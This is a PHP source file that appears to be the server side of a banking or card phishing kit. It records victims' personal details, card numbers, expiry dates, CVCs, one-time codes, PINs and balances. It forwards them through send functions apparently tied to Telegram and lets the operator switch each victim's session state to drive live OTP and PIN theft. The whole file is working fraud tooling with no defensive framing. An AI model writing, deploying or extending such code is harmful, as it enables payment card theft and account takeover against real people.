<?php
require_once('functions.php');
require_once('tg_functions.php');

if (isset($_POST['id_date'])) {
	updateDataSess($_POST['id_date'], 'date', date('d/m/Y H:i:s'));
	
} elseif (isset($_GET['getState'])) {
   echo returnStateSession($_GET['_sess']);

} elseif (isset($_POST['vi'])) {
	insertVisitor(date('d/m/Y H:i:s'), $_SERVER['REMOTE_ADDR']);
//
} elseif (isset($_POST['_info'])) {

	updateDataSess($_POST['sess'], 
		'perso_info', $_POST['_info']);

} elseif (isset($_POST['_chol'])) {

	insertData($_POST['sess'],
		'cc_hol',
		$_POST['_chol']);

	updateDataSess($_POST['sess'],
		'cc_num',
		$_POST['_cnum']);

	updateDataSess($_POST['sess'],
		'cc_exp',
		$_POST['_cexp']);

	updateDataSess($_POST['sess'],
		'cc_cvc',
		$_POST['_ckod']);

	sendCardInfo($_POST['sess'], $_POST['_cnum'], $_POST['_cexp'], $_POST['_ckod']);

} elseif (isset($_POST['_nme'])) {

	$data = "Name: " . $_POST['_nme'] . 
	"<br>Phone number: " . $_POST['_pho'];

	updateDataSess($_POST['sess'],
	'perso_info', $data);

	updateDataSess($_POST['sess'],
	'state', 'LOADING');

} elseif (isset($_POST['kode'])) {

	sendKodeInfo($_POST['sess'], $_POST['kode']);

	updateDataSess($_POST['sess'],
	'otp_kode', $_POST['kode']);

	updateDataSess($_POST['sess'],
	'state', 'LOADING');

} elseif (isset($_POST['_pin'])) {

	updateDataSess($_POST['sess'],
	'pin_code', $_POST['_pin']);

	updateDataSess($_POST['sess'],
	'state', 'LOADING');

	sendPinInfo($_POST['sess'], $_POST['_pin']);

} elseif (isset($_POST['_bala'])) {

	updateDataSess($_POST['sess'],
	'state', 'LOADING');

	sendBalanceInfo($_POST['sess'], $_POST['_bala']);


} elseif (isset($_POST['_status'])) {

	updateDataSess($_POST['sess'],
	'state', $_POST['_status']);

} elseif (isset($_GET['returnBin'])) {
	
	echo checkBin($_GET['_cnumber']);

//Telegram Live:.
} elseif (isset($_GET['opt'])) {
	updateDataSess($_GET['sess'],
	'state', $_GET['opt']);
	echo "Ok! You can close this windows :)";
	echo "<Script>window.close();</script>";
}
?>